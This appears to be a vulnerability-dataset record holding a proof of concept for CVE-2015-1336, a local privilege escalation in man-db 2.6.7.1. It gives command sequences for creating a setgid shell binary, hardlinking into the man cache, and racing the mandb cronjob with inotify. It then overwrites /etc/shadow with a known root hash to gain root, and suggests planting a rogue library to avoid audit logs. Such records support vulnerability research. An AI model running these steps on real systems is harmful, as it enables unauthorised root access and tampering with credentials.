{
    "text": "vul_name : Man-db 2.6.7.1 - Privilege Escalation ( PoC )  ， vul_cve : CVE-2015-1336 ， vul_poc : / *  ， EDB Note :  ， man : man -> man : root ~  ， man : root -> root : root ~  ， CreateSetgidBinary.c ~  ， DirModifyInotify-20110530.c ~  ， man : man -> man : root ， Setgid Binary Creater : The program CreateSetgidBinary.c allows to create the suitable setgid binary circumventing the kernel protection. Currently creating an empty setgid executable in /var/cache/man would work but writing as user man will remove the setgid flag silently. Hence let root itself write binary code to it keeping the flags. But that is not so simple :  ， - Writing an interpreter header would be simple , but start of interpreter in kernel will drop the setgid capability immediately. ， - Hence an ELF binary has to be written. The shellcode from below is just 155 bytes to perform setresgid and execute a shell ， - We need a SUID binary to write arbitrary data to stdout with similar method already used in SuidBinariesAndProcInterface. But they do not just echo , they may perform some kind of transformation , e.g. use basename of arg0 for printing. To avoid transformation do not use SUID binary directly but let ld-linux fault and write out user supplied data without modifications. The faulting can triggered easily using LowMemoryProgramCrashing from previous work. ， - I did not find any SUID binary writing out null-bytes , so they cannot provide the mandatory null-bytes within the ELF header on stdout/stderr. But kernel will help here , just seek beyond end of file before invoking SUID binary , thus filling gap with 0-bytes. ， - The SUID binaries do not write only arg0 but also some error message , thus appending unneeded data to the growing file. As kernel does not allow truncation without losing the setgid property , the SUID binary has to be stopped writing more than needed. This can be done using the nice setrlimit ( RLIMIT_FSIZE , . system call. ， Program Invocation : Following sequence can be used for testing :  ， ` ， root $ su -s /bin/bash man ， man $ cd ， man $ pwd ， /var/cache/man ， man $ ls -al /proc/self/ ， total 0 ， dr-xr-xr-x 9 man man 0 May 15 02 : 08 . ， man $ wget -q ， man $ gcc -o CreateSetgidBinary CreateSetgidBinary.c ， man $ ./CreateSetgidBinary ./escalate /bin/mount x nonexistent-arg ， Completed ， man $ ls -al ./escalate ， -rwsrwsr-t 1 man root 155 May 15 02 : 12 ./escalate ， man $ ./escalate /bin/sh ， man $ ls -al /proc/self/ ， total 0 ， dr-xr-xr-x 9 man root 0 May 15 02 : 13 . ， ` ， man : root -> root : root ， Finding hardlinking target : To start with , user man has to hardlink a file not owned by user man. Without hardlink protection ( /proc/sys/fs/protected_hardlinks set to 0 )  , any root owned system file will do and chown will make it accessible to user man. ， Without hardlink protection , user man one could race with find traversing the directories. It seems that new version of find with fts uses secure open and always checks stat of each file inode , both when entering subdirectories and when leaving. So a real hardlink to a file of another user is needed. ， Even with hardlink protection , linking to file writable by user man is still allowed , but files have to reside on same file system. On standard Ubuntu Vivid system , there are just few target files :  ， ` ， man # find / -mount -type f -perm -0002 2> /dev/null ， /var/crash/.lock ， man # ls -al /var/crash/.lock ， -rwxrwxrwx 1 root root 0 May 23 13 : 10 /var/crash/.lock ， ` ， Using Timerace Using Inotify : As the mandb cronjob will change ownership of any file to user man , there are numerous targets for privilege escalation. The one I like best when /bin/su SUID binary is available to change /etc/shadow. PAM just does not recognise this state , so only root password has to be cleared for su logon. For that purpose , the good old inotify-tool DirModifyInotify-20110530.c from a previous article. To escalate following steps are sufficient :  ， ` ， man # mkdir -p /var/cache/man/etc ， man # ln /var/crash/.lock /var/cache/man/etc/shadow ， man # ./DirModifyInotify -Watch /var/cache/man/etc -WatchCount 0 -MovePath /var/cache/man/etc -LinkTarget /etc ， . Wait till daily cronjob was run ， man # cp /etc/shadow . ， man # sed -r -e 's/^root : . * /root :  $ 1 $ kKBXcycA $ w.1NUJ77AuKcSYYrjLn9s1 : 15462 : 0 : 99999 : 7 : /' /etc/shadow > x ， man # cat x > /etc/shadow ; rm x ， man # su -s /bin/sh ( password is 123 )  ， root # cat shadow > /etc/shadow ; chown root /etc/shadow ， ` ， If one does not want want PAM or su to write something to logs , trip over some audit/apparmor settings , we may want to make some library directory man-owned and place rogue library variant there. ， / * CreateSetgidBinary.c * / ， / This software is provided by the copyright owner \"as is\" and any ，  * expressed or implied warranties , including , but not limited to ,  ，  * the implied warranties of merchantability and fitness for a particular ，  * purpose are disclaimed. In no event shall the copyright owner be ，  * liable for any direct , indirect , incidential , special , exemplary or ，  * consequential damages , including , but not limited to , procurement ，  * of substitute goods or services , loss of use , data or profits or ，  * business interruption , however caused and on any theory of liability ,  ，  * whether in contract , strict liability , or tort , including negligence ，  * or otherwise , arising in any way out of the use of this software ,  ，  * even if advised of the possibility of such damage. ，  * This tool allows to create a setgid binary in appropriate directory ，  * to escalate to the group of this directory. ，  * Compile : gcc -o CreateSetgidBinary CreateSetgidBinary.c ，  * Usage : CreateSetgidBinary [ targetfile ]  [ suid-binary ]  [ placeholder ]  [ args ]  ，  * Example :  ，  *  # ./CreateSetgidBinary ./escalate /bin/mount x nonexistent-arg ，  *  # ls -al ./escalate ，  *  # ./escalate /bin/sh ，  * Copyright ( c ) 2015 halfdog <me ( % ) halfdog.net> ，  * See for more information.",
    "time": "2017.01.26"
}